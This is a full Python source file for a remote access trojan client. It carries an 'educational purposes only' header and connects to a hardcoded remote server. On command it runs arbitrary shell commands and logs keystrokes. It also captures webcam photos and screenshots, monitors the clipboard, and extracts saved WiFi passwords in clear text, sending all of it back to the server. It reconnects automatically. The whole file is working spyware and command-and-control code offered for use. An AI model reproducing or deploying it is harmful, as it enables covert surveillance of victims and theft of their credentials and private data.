# WARNING: This tool is for educational purposes only. Use only in a controlled lab environment with explicit permission.
# Unauthorized use may violate laws and ethical standards.

import socket
import json
import platform
import threading
import subprocess
import time
import psutil
import uuid
import os
import re
import base64
from pynput import keyboard
try:
    import cv2
    import numpy as np
    from PIL import Image
    from io import BytesIO
    WEBCAM_AVAILABLE = True
except ImportError:
    print("Webcam dependencies not available. Webcam capture will be disabled.")
    WEBCAM_AVAILABLE = False

# Try to import clipboard modules
try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError:
    try:
        # On Windows, we can use the win32clipboard module as a fallback
        import win32clipboard
        import win32con
        CLIPBOARD_AVAILABLE = True
    except ImportError:
        print("Clipboard monitoring dependencies not available. Clipboard features will be disabled.")
        CLIPBOARD_AVAILABLE = False

# Configuration
SERVER_IP = os.environ.get('SERVER_IP', 'pablosboson-server-production.up.railway.app')  # Default to Railway deployment
SERVER_PORT = int(os.environ.get('SERVER_PORT', '5000'))  # Must match server.py port
RECONNECT_DELAY = 10     # Seconds between reconnection attempts
HEARTBEAT_INTERVAL = 30  # Seconds between heartbeats
KEYLOG_INTERVAL = 5      # Seconds between keylog data sends

# To connect to a different server, set the SERVER_IP environment variable
# Example: set SERVER_IP=yourapp.onrender.com (on Windows)
# Example: export SERVER_IP=yourapp.onrender.com (on Linux/Mac)
# Default: Uses Railway deployment URL

class Client:
    def __init__(self):
        self.client_id = f"{platform.node()}-{uuid.getnode()}"
        self.session_id = str(uuid.uuid4())
        self.running = True
        self.sock = None
        self.system_info = self.get_system_info()
        self.keystrokes = []
        self.keylogger_listener = None
        self.keylogger_thread = None
        # Clipboard monitoring attributes
        self.clipboard_monitoring = False
        self.clipboard_thread = None
        self.last_clipboard_content = None
        print(f"Client initialized with ID: {self.client_id}")

    def get_system_info(self):
        """Collect detailed system information"""
        try:
            disks = []
            for part in psutil.disk_partitions(all=False):
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    disks.append({
                        "device": part.device,
                        "mountpoint": part.mountpoint,
                        "total_gb": round(usage.total / (1024**3)),
                        "used_gb": round(usage.used / (1024**3)),
                        "free_gb": round(usage.free / (1024**3))
                    })
                except:
                    continue
            
            return {
                "basic": {
                    "hostname": platform.node(),
                    "os": platform.system(),
                    "os_version": platform.version(),
                    "architecture": platform.machine(),
                    "processor": platform.processor(),
                    "python_version": platform.python_version()
                },
                "resources": {
                    "cpu_cores": psutil.cpu_count(),
                    "total_ram": round(psutil.virtual_memory().total / (1024**3)),
                    "disks": disks
                },
                "network": {
                    "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1]),
                    "ip_address": socket.gethostbyname(socket.gethostname())
                },
                "session": {
                    "client_id": self.client_id,
                    "session_id": self.session_id,
                    "process_id": os.getpid()
                }
            }
        except Exception as e:
            print(f"Error collecting system info: {e}")
            return {"error": str(e)}

    def validate_command(self, command):
        """Validate command to prevent injection"""
        safe_pattern = r'^[a-zA-Z0-9\s\-_/\\:.*+=@%]+$'
        return bool(re.match(safe_pattern, command))

    def sanitize_output(self, output):
        """Sanitize command output for JSON encoding"""
        if not output:
            return "No output"
        
        # Convert to string if not already
        output = str(output)
        
        # Handle special case for tasklist command
        if "tasklist" in output or "Image Name" in output:
            # Preserve table structure but ensure it's JSON-safe
            lines = output.splitlines()
            sanitized_lines = []
            for line in lines:
                # Keep only printable characters
                sanitized_line = ''.join(c for c in line if c.isprintable() or c in ['\n', '\r', '\t'])
                sanitized_lines.append(sanitized_line)
            output = '\n'.join(sanitized_lines)
        else:
            # Standard sanitization for other commands
            # Remove non-printable characters and normalize line endings
            output = ''.join(c for c in output if c.isprintable() or c in ['\n', '\r', '\t'])
        
        # Replace multiple newlines with single newline
        output = re.sub(r'\n+', '\n', output).strip()
        
        # Ensure the output is JSON-safe
        try:
            # Test if the output can be JSON encoded
            json.dumps(output)
        except UnicodeEncodeError:
            # If encoding fails, replace problematic characters
            output = output.encode('ascii', 'replace').decode('ascii')
        
        return output

    def execute_command(self, command):
        """Execute system command with explicit mappings"""
        try:
            if not self.validate_command(command):
                print(f"Invalid command rejected: {command}")
                return "ERROR: Invalid command"

            # Explicit command mappings
            command_mappings = {
                "shutdown /s /t 0": "shutdown /s /t 0",
                "cmd.exe": "start cmd /k",  # Opens new CMD window
                "calc.exe": "calc.exe",
                "notepad.exe": "notepad.exe",
                "net user %USERNAME%": "net user %USERNAME%",
                "netstat -ano": "netstat -ano",
                "tasklist": "tasklist",  # List running processes
                "runas /user:Administrator cmd.exe": "start runas /user:Administrator cmd.exe",
                "netsh wlan show profiles": "netsh wlan show profiles"  # List WiFi profiles
            }

            print(f"Executing command: {command}")
            args = command_mappings.get(command, command)
            shell = True  # Use shell=True for all commands to handle complex syntax

            # Special handling for tasklist command
            if command == "tasklist":
                print("Using special handling for tasklist command")
                try:
                    # Run tasklist with CSV format for easier parsing
                    result = subprocess.run(
                        "tasklist /FO CSV",
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        timeout=30,
                        encoding='utf-8',
                        errors='replace'
                    )
                    
                    if result.returncode == 0:
                        # Convert CSV to a more readable format
                        lines = result.stdout.strip().split('\n')
                        if len(lines) > 1:
                            # Parse CSV (handling quotes)
                            import csv
                            from io import StringIO
                            
                            reader = csv.reader(StringIO(result.stdout))
                            headers = next(reader)  # Get headers
                            
                            # Format as a table
                            formatted_output = "Process Name               PID     Memory Usage\n"
                            formatted_output += "----------------------------------------\n"
                            
                            for row in reader:
                                if len(row) >= 5:  # Ensure we have enough columns
                                    process_name = row[0]
                                    pid = row[1]
                                    memory = row[4]
                                    formatted_output += f"{process_name:<25} {pid:<8} {memory}\n"
                            
                            output = self.sanitize_output(formatted_output)
                            print(f"Tasklist formatted successfully")
                            return output
                        else:
                            return "No processes found"
                    else:
                        return f"ERROR: tasklist command failed with code {result.returncode}"
                except Exception as e:
                    print(f"Error formatting tasklist: {e}")
                    # Fall back to regular execution if special handling fails
            
            # Special handling for WiFi passwords
            elif command == "netsh wlan show profiles":
                print("Using special handling for WiFi passwords command")
                try:
                    # First, get all WiFi profiles
                    result = subprocess.run(
                        "netsh wlan show profiles",
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        timeout=30,
                        encoding='utf-8',
                        errors='replace'
                    )
                    
                    if result.returncode == 0:
                        # Extract profile names
                        profiles = []
                        for line in result.stdout.split('\n'):
                            if "All User Profile" in line:
                                # Extract profile name
                                profile = line.split(":")
                                if len(profile) > 1:
                                    profile_name = profile[1].strip()
                                    profiles.append(profile_name)
                        
                        if not profiles:
                            return "No WiFi profiles found"
                        
                        # Get passwords for each profile
                        formatted_output = "WiFi Network Passwords\n"
                        formatted_output += "=====================\n\n"
                        
                        for profile_name in profiles:
                            # Get password for this profile
                            password_cmd = f'netsh wlan show profile name="{profile_name}" key=clear'
                            pwd_result = subprocess.run(
                                password_cmd,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True,
                                timeout=10,
                                encoding='utf-8',
                                errors='replace'
                            )
                            
                            if pwd_result.returncode == 0:
                                # Extract password
                                password = "Not Found"
                                for line in pwd_result.stdout.split('\n'):
                                    if "Key Content" in line:
                                        pwd_parts = line.split(":")
                                        if len(pwd_parts) > 1:
                                            password = pwd_parts[1].strip()
                                
                                formatted_output += f"Network: {profile_name}\n"
                                formatted_output += f"Password: {password}\n\n"
                        
                        output = self.sanitize_output(formatted_output)
                        print(f"WiFi passwords retrieved successfully")
                        return output
                    else:
                        return f"ERROR: WiFi command failed with code {result.returncode}"
                except Exception as e:
                    print(f"Error retrieving WiFi passwords: {e}")
                    # Fall back to regular execution if special handling fails
            
            # Standard execution for other commands
            result = subprocess.run(
                args,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
            
            if result.returncode == 0:
                output = self.sanitize_output(result.stdout.strip() or "Command executed successfully")
                print(f"Command success: {len(output)} characters")
                return output
            else:
                error = self.sanitize_output(f"ERROR ({result.returncode}): {result.stderr.strip()}")
                print(f"Command error: {error}")
                return error
                
        except subprocess.TimeoutExpired:
            print("Command timed out")
            return "ERROR: Command timed out after 30 seconds"
        except Exception as e:
            print(f"Command execution error: {e}")
            return f"ERROR: {str(e)}"

    def start_keylogger(self):
        """Start capturing keystrokes"""
        try:
            if self.keylogger_listener:
                print("Keylogger already running")
                return "Keylogger already running"

            def on_press(key):
                try:
                    self.keystrokes.append(str(key))
                except:
                    pass
            
            self.keylogger_listener = keyboard.Listener(on_press=on_press)
            self.keylogger_listener.start()
            self.keylogger_thread = threading.Thread(target=self.send_keylog_data, daemon=True)
            self.keylogger_thread.start()
            print("Keylogger started")
            return "Keylogger started"
        except Exception as e:
            print(f"Keylogger start error: {e}")
            return f"ERROR: {str(e)}"

    def stop_keylogger(self):
        """Stop capturing keystrokes"""
        try:
            if self.keylogger_listener:
                self.keylogger_listener.stop()
                self.keylogger_listener = None
                self.keylogger_thread = None
                self.keystrokes = []
                print("Keylogger stopped")
                return "Keylogger stopped"
            print("Keylogger not running")
            return "Keylogger not running"
        except Exception as e:
            print(f"Keylogger stop error: {e}")
            return f"ERROR: {str(e)}"
            
    def capture_webcam(self):
        """Capture an image from the webcam"""
        if not WEBCAM_AVAILABLE:
            return "ERROR: Webcam dependencies not available"
            
        try:
            # Initialize webcam
            cap = cv2.VideoCapture(0)  # 0 is usually the default webcam
            
            if not cap.isOpened():
                return "ERROR: Could not access webcam"
                
            # Wait a moment for the camera to initialize
            time.sleep(1)
            
            # Capture a frame
            ret, frame = cap.read()
            
            # Release the webcam
            cap.release()
            
            if not ret:
                return "ERROR: Failed to capture image"
                
            # Convert the image to JPEG format
            _, buffer = cv2.imencode('.jpg', frame)
            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
            
            # Send the image data
            print("Webcam image captured successfully")
            
            # Return a preview message - the actual image data will be sent separately
            return {
                "message": "Webcam image captured successfully",
                "image_data": jpg_as_text
            }
            
        except Exception as e:
            print(f"Webcam capture error: {e}")
            return f"ERROR: {str(e)}"
            
    def capture_screenshot(self):
        """Capture a screenshot of the client's screen"""
        if not WEBCAM_AVAILABLE:  # We use the same dependencies for screenshots
            return "ERROR: Screenshot dependencies not available"
            
        try:
            # Import PIL only when needed
            from PIL import ImageGrab
            
            # Capture the screen
            screenshot = ImageGrab.grab()
            
            # Convert to a format we can send
            buffer = BytesIO()
            screenshot.save(buffer, format="JPEG", quality=70)  # Lower quality to reduce size
            buffer.seek(0)
            
            # Convert to base64
            img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            
            print("Screenshot captured successfully")
            
            # Return the screenshot data
            return {
                "message": "Screenshot captured successfully",
                "image_data": img_base64
            }
            
        except Exception as e:
            print(f"Screenshot capture error: {e}")
            return f"ERROR: {str(e)}"
            
    def get_clipboard_content(self):
        """Get the current clipboard content"""
        if not CLIPBOARD_AVAILABLE:
            return "ERROR: Clipboard monitoring dependencies not available"
            
        try:
            clipboard_text = ""
            
            # Try to use pyperclip first
            try:
                import pyperclip
                clipboard_text = pyperclip.paste()
            except:
                # Fall back to win32clipboard on Windows
                try:
                    import win32clipboard
                    import win32con
                    
                    win32clipboard.OpenClipboard()
                    try:
                        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                            clipboard_text = win32clipboard.GetClipboardData(win32con.CF_TEXT).decode('utf-8', errors='replace')
                        elif win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
                            clipboard_text = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
                    finally:
                        win32clipboard.CloseClipboard()
                except:
                    return "ERROR: Failed to access clipboard"
            
            if not clipboard_text:
                return "Clipboard is empty or contains non-text data"
                
            return clipboard_text
            
        except Exception as e:
            print(f"Clipboard access error: {e}")
            return f"ERROR: {str(e)}"
            
    def start_clipboard_monitoring(self):
        """Start monitoring the clipboard for changes"""
        if not CLIPBOARD_AVAILABLE:
            return "ERROR: Clipboard monitoring dependencies not available"
            
        if self.clipboard_monitoring:
            return "Clipboard monitoring is already running"
            
        try:
            # Get initial clipboard content
            self.last_clipboard_content = self.get_clipboard_content()
            if isinstance(self.last_clipboard_content, str) and self.last_clipboard_content.startswith("ERROR:"):
                return self.last_clipboard_content
                
            # Start monitoring thread
            self.clipboard_monitoring = True
            self.clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
            self.clipboard_thread.start()
            
            print("Clipboard monitoring started")
            return "Clipboard monitoring started"
            
        except Exception as e:
            print(f"Clipboard monitoring start error: {e}")
            return f"ERROR: {str(e)}"
            
    def stop_clipboard_monitoring(self):
        """Stop monitoring the clipboard"""
        if not self.clipboard_monitoring:
            return "Clipboard monitoring is not running"
            
        try:
            self.clipboard_monitoring = False
            self.clipboard_thread = None
            self.last_clipboard_content = None
            
            print("Clipboard monitoring stopped")
            return "Clipboard monitoring stopped"
            
        except Exception as e:
            print(f"Clipboard monitoring stop error: {e}")
            return f"ERROR: {str(e)}"
            
    def monitor_clipboard(self):
        """Monitor clipboard for changes and send updates"""
        print("Clipboard monitoring thread started")
        
        while self.running and self.clipboard_monitoring:
            try:
                # Get current clipboard content
                current_content = self.get_clipboard_content()
                
                # Check if it's an error message
                if isinstance(current_content, str) and not current_content.startswith("ERROR:"):
                    # Check if content has changed
                    if current_content != self.last_clipboard_content and current_content != "Clipboard is empty or contains non-text data":
                        print("Clipboard content changed")
                        
                        # Update last known content
                        self.last_clipboard_content = current_content
                        
                        # Send the update to the server
                        if self.sock:
                            try:
                                # Truncate very long clipboard content
                                if len(current_content) > 10000:
                                    display_content = current_content[:10000] + "... [content truncated]"
                                else:
                                    display_content = current_content
                                    
                                response = {
                                    "type": "clipboard_data",
                                    "data": display_content,
                                    "client_id": self.client_id,
                                    "timestamp": time.time()
                                }
                                
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print("Sent clipboard update")
                            except Exception as e:
                                print(f"Error sending clipboard update: {e}")
                
            except Exception as e:
                print(f"Clipboard monitoring error: {e}")
                
            # Sleep to prevent high CPU usage
            time.sleep(1)

    def send_keylog_data(self):
        """Periodically send captured keystrokes to the server"""
        while self.running and self.keylogger_listener and self.keylogger_listener.running:
            if self.keystrokes:
                try:
                    keylog_data = " ".join(self.keystrokes)
                    response = {
                        "type": "keylog_data",
                        "data": keylog_data,
                        "client_id": self.client_id
                    }
                    
                    try:
                        # Ensure proper JSON encoding
                        json_data = json.dumps(response, ensure_ascii=True)
                        self.sock.sendall(json_data.encode('utf-8'))
                        print(f"Sent keylog data: {keylog_data[:50]}..." if len(keylog_data) > 50 else f"Sent keylog data: {keylog_data}")
                        self.keystrokes = []
                    except Exception as e:
                        print(f"Error encoding keylog data: {e}")
                        # Send a simplified error response instead
                        error_response = {
                            "type": "error",
                            "data": f"Error sending keylog data: {str(e)}",
                            "client_id": self.client_id
                        }
                        self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                        self.keystrokes = []  # Clear keystrokes to prevent repeated errors
                except Exception as e:
                    print(f"Keylog send error: {e}")
            time.sleep(KEYLOG_INTERVAL)

    def send_heartbeat(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                if self.sock:
                    heartbeat = {
                        "type": "heartbeat",
                        "data": {
                            "client_id": self.client_id,
                            "status": "active",
                            "timestamp": time.time()
                        }
                    }
                    try:
                        # Ensure proper JSON encoding
                        json_data = json.dumps(heartbeat, ensure_ascii=True)
                        self.sock.sendall(json_data.encode('utf-8'))
                        print("Heartbeat sent")
                    except Exception as e:
                        print(f"Error encoding heartbeat: {e}")
            except Exception as e:
                print(f"Heartbeat error: {e}")
            time.sleep(HEARTBEAT_INTERVAL)

    def handle_server_connection(self):
        """Main connection handler"""
        while self.running:
            try:
                # Establish connection
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(10)
                print(f"Attempting to connect to {SERVER_IP}:{SERVER_PORT}")
                self.sock.connect((SERVER_IP, SERVER_PORT))
                print("Connected to server")
                
                # Send initial system info
                initial_data = {
                    "type": "system_info",
                    "data": self.system_info
                }
                try:
                    # Ensure proper JSON encoding
                    json_data = json.dumps(initial_data, ensure_ascii=True)
                    self.sock.sendall(json_data.encode('utf-8'))
                    print("Sent system info")
                except Exception as e:
                    print(f"Error sending system info: {e}")
                    # Try with a simplified version if the full system info is too complex
                    try:
                        simplified_data = {
                            "type": "system_info",
                            "data": {
                                "basic": {
                                    "hostname": platform.node(),
                                    "os": platform.system()
                                },
                                "network": {
                                    "ip_address": socket.gethostbyname(socket.gethostname())
                                },
                                "session": {
                                    "client_id": self.client_id
                                }
                            }
                        }
                        self.sock.sendall(json.dumps(simplified_data, ensure_ascii=True).encode('utf-8'))
                        print("Sent simplified system info")
                    except Exception as e2:
                        print(f"Error sending simplified system info: {e2}")
                        # Connection will likely fail, but we'll let the main error handling take care of it
                
                # Start heartbeat thread
                threading.Thread(target=self.send_heartbeat, daemon=True).start()
                
                self.sock.settimeout(None)
                while self.running:
                    try:
                        data = self.sock.recv(4096)
                        if not data:
                            print("Server disconnected")
                            break
                            
                        message = json.loads(data.decode('utf-8'))
                        message_type = message.get('type')
                        message_data = message.get('data')
                        print(f"Received message: {message}")

                        if message_type == 'command':
                            output = self.execute_command(message_data)
                            response = {
                                "type": "command_result",
                                "data": output,
                                "command": message_data,
                                "client_id": self.client_id
                            }
                            
                            try:
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print(f"Sent command result for: {message_data}")
                            except Exception as e:
                                print(f"Error encoding response: {e}")
                                # Send a simplified error response instead
                                error_response = {
                                    "type": "error",
                                    "data": f"Error processing command output: {str(e)}",
                                    "command": message_data,
                                    "client_id": self.client_id
                                }
                                self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                            
                        elif message_type == 'keylog_start':
                            output = self.start_keylogger()
                            response = {
                                "type": "command_result",
                                "data": output,
                                "command": "keylog_start",
                                "client_id": self.client_id
                            }
                            try:
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print(f"Sent keylog start result: {output}")
                            except Exception as e:
                                print(f"Error encoding keylog start response: {e}")
                                error_response = {
                                    "type": "error",
                                    "data": f"Error processing keylog start: {str(e)}",
                                    "command": "keylog_start",
                                    "client_id": self.client_id
                                }
                                self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                            
                        elif message_type == 'keylog_stop':
                            output = self.stop_keylogger()
                            response = {
                                "type": "command_result",
                                "data": output,
                                "command": "keylog_stop",
                                "client_id": self.client_id
                            }
                            try:
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print(f"Sent keylog stop result: {output}")
                            except Exception as e:
                                print(f"Error encoding keylog stop response: {e}")
                                error_response = {
                                    "type": "error",
                                    "data": f"Error processing keylog stop: {str(e)}",
                                    "command": "keylog_stop",
                                    "client_id": self.client_id
                                }
                                self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                                
                        elif message_type == 'capture_webcam':
                            print("Received webcam capture command")
                            output = self.capture_webcam()
                            
                            # Check if output is a dictionary with image data
                            if isinstance(output, dict) and 'image_data' in output:
                                # Extract image data and message
                                image_data = output['image_data']
                                message = output['message']
                                
                                # Send the response with the image data
                                response = {
                                    "type": "webcam_image",
                                    "data": message,
                                    "image_data": image_data,
                                    "command": "capture_webcam",
                                    "client_id": self.client_id
                                }
                            else:
                                # If there was an error, send the error message
                                response = {
                                    "type": "command_result",
                                    "data": output,
                                    "command": "capture_webcam",
                                    "client_id": self.client_id
                                }
                                
                            try:
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print("Sent webcam capture result")
                            except Exception as e:
                                print(f"Error encoding webcam capture response: {e}")
                                error_response = {
                                    "type": "error",
                                    "data": f"Error processing webcam capture: {str(e)}",
                                    "command": "capture_webcam",
                                    "client_id": self.client_id
                                }
                                self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                                
                        elif message_type == 'capture_screenshot':
                            print("Received screenshot capture command")
                            output = self.capture_screenshot()
                            
                            # Check if output is a dictionary with image data
                            if isinstance(output, dict) and 'image_data' in output:
                                # Extract image data and message
                                image_data = output['image_data']
                                message = output['message']
                                
                                # Send the response with the image data
                                response = {
                                    "type": "screenshot_image",
                                    "data": message,
                                    "image_data": image_data,
                                    "command": "capture_screenshot",
                                    "client_id": self.client_id
                                }
                            else:
                                # If there was an error, send the error message
                                response = {
                                    "type": "command_result",
                                    "data": output,
                                    "command": "capture_screenshot",
                                    "client_id": self.client_id
                                }
                                
                            try:
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print("Sent screenshot capture result")
                            except Exception as e:
                                print(f"Error encoding screenshot capture response: {e}")
                                error_response = {
                                    "type": "error",
                                    "data": f"Error processing screenshot capture: {str(e)}",
                                    "command": "capture_screenshot",
                                    "client_id": self.client_id
                                }
                                self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                                
                        elif message_type == 'clipboard_start':
                            print("Received clipboard monitoring start command")
                            output = self.start_clipboard_monitoring()
                            response = {
                                "type": "command_result",
                                "data": output,
                                "command": "clipboard_start",
                                "client_id": self.client_id
                            }
                            try:
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print("Sent clipboard start result")
                            except Exception as e:
                                print(f"Error encoding clipboard start response: {e}")
                                error_response = {
                                    "type": "error",
                                    "data": f"Error starting clipboard monitoring: {str(e)}",
                                    "command": "clipboard_start",
                                    "client_id": self.client_id
                                }
                                self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                                
                        elif message_type == 'clipboard_stop':
                            print("Received clipboard monitoring stop command")
                            output = self.stop_clipboard_monitoring()
                            response = {
                                "type": "command_result",
                                "data": output,
                                "command": "clipboard_stop",
                                "client_id": self.client_id
                            }
                            try:
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print("Sent clipboard stop result")
                            except Exception as e:
                                print(f"Error encoding clipboard stop response: {e}")
                                error_response = {
                                    "type": "error",
                                    "data": f"Error stopping clipboard monitoring: {str(e)}",
                                    "command": "clipboard_stop",
                                    "client_id": self.client_id
                                }
                                self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                                
                        elif message_type == 'clipboard_get':
                            print("Received clipboard get command")
                            output = self.get_clipboard_content()
                            response = {
                                "type": "command_result",
                                "data": output,
                                "command": "clipboard_get",
                                "client_id": self.client_id
                            }
                            try:
                                # Ensure proper JSON encoding
                                json_data = json.dumps(response, ensure_ascii=True)
                                self.sock.sendall(json_data.encode('utf-8'))
                                print("Sent clipboard content")
                            except Exception as e:
                                print(f"Error encoding clipboard content response: {e}")
                                error_response = {
                                    "type": "error",
                                    "data": f"Error getting clipboard content: {str(e)}",
                                    "command": "clipboard_get",
                                    "client_id": self.client_id
                                }
                                self.sock.sendall(json.dumps(error_response, ensure_ascii=True).encode('utf-8'))
                            
                    except json.JSONDecodeError as e:
                        print(f"JSON decode error: {e}")
                        error_response = {
                            "type": "error",
                            "data": f"Invalid JSON received: {str(e)}",
                            "client_id": self.client_id
                        }
                        self.sock.sendall(json.dumps(error_response, ensure_ascii=False).encode('utf-8'))
                    except ConnectionResetError:
                        print("Connection reset by server")
                        break
                    except socket.timeout:
                        print("Socket timeout")
                        break
                    except Exception as e:
                        print(f"Message handling error: {e}")
                        error_response = {
                            "type": "error",
                            "data": str(e),
                            "client_id": self.client_id
                        }
                        self.sock.sendall(json.dumps(error_response, ensure_ascii=False).encode('utf-8'))
                        
            except (ConnectionRefusedError, socket.timeout):
                print("Connection failed, retrying...")
            except Exception as e:
                print(f"Connection error: {e}")
            finally:
                if self.sock:
                    self.sock.close()
                    self.sock = None
                if self.running:
                    time.sleep(RECONNECT_DELAY)

    def start(self):
        """Start the client"""
        try:
            print("Starting client")
            self.handle_server_connection()
        except KeyboardInterrupt:
            print("Shutting down client")
            self.running = False
            if self.keylogger_listener:
                self.keylogger_listener.stop()
            if self.sock:
                self.sock.close()
        finally:
            print("Client stopped")

if __name__ == "__main__":
    client = Client()
    client.start()